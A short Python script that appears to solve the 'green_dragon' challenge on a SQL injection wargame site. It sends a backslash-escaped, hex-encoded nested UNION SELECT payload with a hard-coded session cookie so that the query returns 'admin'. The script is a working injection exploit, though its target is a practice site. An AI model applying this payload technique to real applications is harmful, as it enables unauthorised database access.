import requests

cookies = {"PHPSESSID": "iseeqtqodf0v3uruusgvtv6qfk"}

url = "https://los.rubiya.kr/chall/green_dragon_74d944f888fd3f9cf76e4e230e78c45b.php"

# the table is empty.
# union select should be a string or a number
params = {"id": "\\", "pw": " union select 0x5c,0x20756e696f6e2073656c6563742030783631363436643639366523#"}

r = requests.get(url, params=params, cookies=cookies)
print(r.text)